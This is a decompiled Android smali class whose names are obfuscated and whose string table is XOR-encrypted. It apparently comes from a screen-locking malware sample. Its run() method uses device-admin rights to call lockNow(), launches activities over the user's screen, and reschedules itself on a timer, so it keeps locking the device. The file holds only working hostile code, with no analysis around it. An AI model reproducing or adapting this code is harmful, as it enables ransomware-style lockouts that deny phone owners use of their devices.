.class Lzvy/zpfypq/bbuhtkwvaf/p;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static final a:[Ljava/lang/String;


# instance fields
.field final synthetic b:Landroid/os/Handler;

.field final synthetic c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/4 v0, 0x6

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "b\u0014R\u00007j\u001e\u0018\u0001=w\u000e_\u001c?pTe7\u000cW3x5\u000b"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/16 v9, 0x58

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "b\u0014R\u00007j\u001e\u0018\u001b6w\u001fX\u0006vb\u0019B\u001b7mT{3\u0011M"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "b\u0014R\u00007j\u001e\u0018\u001b6w\u001fX\u0006v`\u001bB\u0017?l\u0008O\\\u0010L7s"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "b\u0014R\u00007j\u001e\u0018\u001b6w\u001fX\u0006v`\u001bB\u0017?l\u0008O\\\u0010L7s"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "g\u001f@\u001b;f%F\u001d4j\u0019O"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "b\u0014R\u00007j\u001e\u0018\u001b6w\u001fX\u0006vb\u0019B\u001b7mT{3\u0011M"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    return-void

    :pswitch_5
    const/4 v9, 0x3

    goto :goto_2

    :pswitch_6
    const/16 v9, 0x7a

    goto :goto_2

    :pswitch_7
    const/16 v9, 0x36

    goto :goto_2

    :pswitch_8
    const/16 v9, 0x72

    goto :goto_2

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method constructor <init>(Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    iput-object p2, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->b:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    const v8, 0x74008000

    const/high16 v7, 0x10000000

    const/4 v6, 0x3

    const/4 v5, 0x1

    const/4 v4, 0x0

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    const/4 v2, 0x4

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-virtual {v2}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lzvy/zpfypq/bbuhtkwvaf/IlIlILlIILIllIllllIllllIlllIlllllIIlIIlIlllILlIllIIIllLl;

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    sget v1, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->c:I

    if-ne v1, v5, :cond_0

    invoke-virtual {v0}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    aget-object v1, v1, v4

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    aget-object v1, v1, v5

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    const/4 v2, 0x2

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->startActivity(Landroid/content/Intent;)V

    const/16 v0, 0x64

    sput v0, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->a:I

    :cond_0
    sget v0, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->c:I

    if-ne v0, v6, :cond_1

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->startActivity(Landroid/content/Intent;)V

    sput v4, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->c:I

    :cond_1
    sget v0, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->c:I

    const/4 v1, 0x6

    if-ne v0, v1, :cond_2

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    const/4 v2, 0x5

    aget-object v1, v1, v2

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/p;->a:[Ljava/lang/String;

    aget-object v1, v1, v6

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->c:Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->startActivity(Landroid/content/Intent;)V

    sput v4, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->c:I

    :cond_2
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/p;->b:Landroid/os/Handler;

    sget v1, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;->a:I

    int-to-long v1, v1

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
